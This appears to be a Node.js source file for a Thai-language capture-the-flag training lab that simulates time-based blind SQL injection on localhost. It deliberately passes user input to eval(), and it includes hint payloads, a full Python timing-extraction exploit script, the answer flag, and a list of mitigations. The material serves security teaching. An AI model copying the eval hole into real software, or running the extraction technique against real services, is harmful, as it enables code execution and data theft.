/**
 * LEVEL 07 - TIME-BASED BLIND SQL INJECTION
 * ความยาก: ★★★★★★★☆☆☆
 *
 * จุดอ่อน: SQL Injection ที่ไม่แสดงผลใดๆ เลย ไม่มีแม้แต่ true/false
 *          แต่สามารถใช้การหน่วงเวลา (sleep) เพื่อดึงข้อมูลทีละบิตได้
 * กลไกการป้องกัน: Prepared Statements, Input Validation, Error Suppression
 * วิธีผ่าน: ใช้ time-based injection โดยวัดเวลา response ว่าใช้นานกว่าปกติหรือไม่
 *
 * ✅ สามารถรันเป็น standalone ได้: node lab/levels/level07.js
 * 🚀 Port: 8107
 */

const express = require("express");
const router = express.Router();

const SECRET_FLAG = "FLAG{time_based_blind_sql_07_stealth}";

// Helper: synchronous sleep (จำลอง DB delay)
function sleepSync(ms) {
  const start = Date.now();
  while (Date.now() - start < ms) {}
}

router.get("/product/search", (req, res) => {
  const productId = req.query.id;

  // ❌ จุดอ่อน: Time-Based Blind SQL Injection Pattern (จำลอง)
  // ระบบนี้ไม่แสดง true/false เลย — ตอบ "OK" เสมอ
  // แต่ถ้าเงื่อนไขเป็น true จะหน่วงเวลา 2 วินาที
  try {
    const result = eval(`
      // จำลองฐานข้อมูล
      const secret = "${SECRET_FLAG}";
      (function() {
        try {
          return ${productId};
        } catch(e) {
          return false;
        }
      })()
    `);

    if (result === true || result > 0) {
      // เงื่อนไข true → หน่วงเวลา (จำลอง SLEEP ใน SQL)
      sleepSync(2000);
    }
  } catch (e) {
    // กลืน error ทั้งหมด — ไม่มี feedback ใดๆ
  }

  // ตอบเหมือนกันเสมอ ไม่ว่าผลจะเป็นอะไร
  res.send("✅ OK");
});

router.get("/", (req, res) => {
  res.send(`
    <html>
    <head><title>Level 07 - Time-Based Blind SQL Injection</title></head>
    <body style="max-width: 650px; margin: 50px auto; font-family: monospace;">
        <h1>⏱️ LEVEL 07</h1>
        <h3>Time-Based Blind SQL Injection</h3>
        <hr>
        <p>ระบบนี้ไม่แสดงผลอะไรเลย — ตอบ <strong>OK</strong> เสมอ ไม่ว่าจะใส่อะไร</p>
        <p>ไม่มี true/false ไม่มี error ไม่มีข้อมูลรั่วไหล</p>
        <p>แต่ถ้าคุณรู้จัก <strong>เวลา</strong>... มันคือทุกอย่าง</p>

        <h4>ค้นหาสินค้า:</h4>
        <form action="/product/search" method="GET">
            <input type="text" name="id" placeholder="Product ID" style="padding: 8px; width: 300px;">
            <button type="submit" style="padding: 8px 16px;">ค้นหา</button>
        </form>

        <div id="timer" style="margin-top: 10px; font-size: 0.9em; color: #555;"></div>

        <div style="background: #fff3cd; padding: 15px; border-radius: 4px; margin: 20px 0;">
            <strong>Hint:</strong> ลองวัดเวลา response:<br>
            <code>id=1</code> → เร็ว (~0ms)<br>
            <code>id=1==1</code> → ช้า (~2000ms) ← เงื่อนไข true!<br><br>
            จากนั้นถามทีละตัวอักษร:<br>
            <code>id=secret.charCodeAt(0) === 70</code> → ช้า = ตัวแรกคือ 'F'
        </div>

        <div style="background: #f8d7da; padding: 15px; border-radius: 4px; margin: 20px 0;">
            <strong>Challenge:</strong> script อัตโนมัติที่วัด response time เพื่อดึง flag ทีละ character
        </div>

        <details style="margin-top: 20px;">
          <summary style="cursor:pointer; font-weight:bold;">💡 ตัวอย่าง Exploit Script (Python)</summary>
          <pre style="background:#1e1e1e; color:#d4d4d4; padding:15px; border-radius:4px; overflow-x:auto; margin-top:10px;">
import requests, time, string

BASE = "http://localhost:8107/product/search"
THRESHOLD = 1.5  # วินาที
CHARSET = string.printable

flag = ""
pos = 0

while True:
    found = False
    for ch in CHARSET:
        code = ord(ch)
        payload = f"secret.charCodeAt({pos}) === {code}"
        start = time.time()
        requests.get(BASE, params={"id": payload})
        elapsed = time.time() - start

        if elapsed >= THRESHOLD:
            flag += ch
            print(f"[+] pos {pos}: '{ch}' → flag so far: {flag}")
            pos += 1
            found = True
            break

    if not found:
        print(f"\\n[✓] FLAG: {flag}")
        break
          </pre>
        </details>

        <script>
          // วัดเวลา response อัตโนมัติ
          const form = document.querySelector("form");
          const timerEl = document.getElementById("timer");
          form.addEventListener("submit", function(e) {
            const t = Date.now();
            timerEl.textContent = "⏳ กำลังส่ง...";
            setTimeout(() => {
              // หลัง submit จะ navigate ไปหน้าใหม่ แต่ก็ให้ hint ไว้
            }, 0);
          });
        </script>
    </body>
    </html>
  `);
});

// ✅ Standalone Server สำหรับรันทีละไฟล์
if (require.main === module) {
  const app = express();
  app.use("/", router);

  const PORT = 8107;
  app.listen(PORT, () => {
    console.log("\n=========================================");
    console.log("⏱️  LEVEL 07 - Time-Based Blind SQL Injection");
    console.log("=========================================");
    console.log(`✅ RUNNING at: http://localhost:${PORT}`);
    console.log(`💡 วิธีผ่าน: วัด response time — ช้า = true, เร็ว = false`);
    console.log(`🔑 FLAG ซ่อนใน: secret variable ภายใน eval`);
    console.log("=========================================\n");
  });
}

module.exports = {
  router,
  info: {
    level: 7,
    port: 8107,
    name: "Time-Based Blind SQL Injection",
    vulnerability:
      "Time-based blind injection — no output, no boolean feedback",
    difficulty: 7,
    exploit_hint:
      "server ตอบ OK เสมอ แต่ถ้าเงื่อนไขเป็น true จะตอบช้า 2 วินาที — ใช้ตรงนี้ดึงข้อมูลทีละ character",
    mitigation:
      "ใช้ Prepared Statements, หลีกเลี่ยง eval(), ตั้ง query timeout, rate limiting",
    solution:
      "เขียน script วัด response time แล้วถามทีละ charCode จนได้ FLAG ครบ",
  },
};
